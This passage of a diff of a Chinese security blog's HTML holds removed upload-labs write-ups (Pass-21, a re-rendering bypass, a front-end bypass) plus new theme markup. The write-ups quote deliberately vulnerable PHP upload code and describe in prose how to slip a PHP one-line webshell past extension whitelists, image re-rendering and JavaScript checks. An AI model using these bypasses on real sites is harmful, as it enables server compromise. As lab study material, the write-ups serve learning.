function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>首先检查conteng-type  源码表示只允许jpg，png，gif</p>
-</blockquote>
-<blockquote>
-<p>主要漏洞在数组这里</p>
-</blockquote>
-<p>需要在burp上面更改数组，让在有值的后面几位都是空的，例如file[0]&#x3D;1.php. file[1]’&#x3D;null,file[7]&#x3D;1,还需要更改content-type</p>
-<p><img src="/.com//image-20250202154152-0fqfc21.png" alt="image"></p>
-<p>变成数组的意义提交，第一个是1.php，更改一个比较长的值，第4个就是jpg白名单绕过</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" data-id="cmaxygi16002roc7k6xnyf1hv" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/二次渲染绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];<span class="comment">//会去获得浏览器中的content-type</span></span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);<span class="comment">//使用上传的图片生成新的图片,文件的重写，二次渲染</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;         </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagegif</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>经过二次渲染以后的图片马，将不会保留一句话木马，只保留图片的原始信息</p>
-</blockquote>
-<p>所以要绕过，我们就去找二次渲染后的图片，然后比较和之前的图片相同的地方，然后因为那里面是不会被二次渲染的，我们在那里插入我们的一句话木马</p>
-<blockquote>
-<p>但是推荐用gif，因为gif的二次渲染的相匹配的更多</p>
-</blockquote>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote>
-<p>php二次渲染不会重复多次渲染，我们可以检测二次渲染过后的再上传再看，然后再在二次渲染的图片中插入一句话木马，有可能不会被二次渲染掉</p>
-</blockquote>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/" data-id="cmaxygi17002toc7kh9xp0o94" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/文件上传/upload-labs/前端绕过" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>没抓到包，说明还没发到后端，在前端就被拦截下来了</p>
-<h1 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h1><h2 id="1-由于找到是前端且js，所以我们直接禁用js"><a href="#1-由于找到是前端且js，所以我们直接禁用js" class="headerlink" title="1.由于找到是前端且js，所以我们直接禁用js"></a>1.由于找到是前端且js，所以我们直接禁用js</h2><h2 id="2-我们可以把绕过函数那个检测删除掉"><a href="#2-我们可以把绕过函数那个检测删除掉" class="headerlink" title="2.我们可以把绕过函数那个检测删除掉"></a>2.我们可以把绕过函数那个检测删除掉</h2><p><img src="/.com//image-20250114181752-uow71t3.png" alt="image"></p>
-<p>删除掉以后，我们可以直接上传php一句话木马</p>
-<p>‍</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%89%8D%E7%AB%AF%E7%BB%95%E8%BF%87/" data-id="cmaxygi17002uoc7k7x81cz41" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-  <nav id="page-nav">
-    
-    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
-  </nav>
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">April 2024</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
           </li>
+          
         
-          <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
-          </li>
         
-          <li>
-            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
     </div>
   </div>
+</nav>
 
   
-</aside>
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Welcome to My Blog"></span>
+          
+        </div>
+
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
+
       
-      &copy; 2025 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
     </div>
   </div>
-</footer>
+</div>
 
-    </div>
-    <nav id="mobile-nav">
+</div>
+
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div id="board"
+          style="margin-top: 0">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="Pass-20">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" target="_self">
+          Pass-20
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt " href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-20/" target="_self">
+        <div>
+          Pass-20123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;    //检查MIME    $allow_type = array(&#x27;image/jpeg&#x
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2025-05-20 00:00" pubdate>
+              2025-05-20
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
   
-    <a href="/" class="mobile-nav-link">Home</a>
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
   
-</nav>
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="category-chain-item">文件上传</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/" class="category-chain-item">upload-labs</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Pass-20/">#Pass-20</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+      <div class="col-12 col-md-4 m-auto index-img">
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" target="_self">
+          <img src="/image/default.png" srcset="/image/loading.gif" lazyload alt="Pass-21">
+        </a>
+      </div>
+    
+    <article class="col-12 col-md-8 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/" target="_self">
+          Pass-21
+        </a>
+      </h2>
+
+      
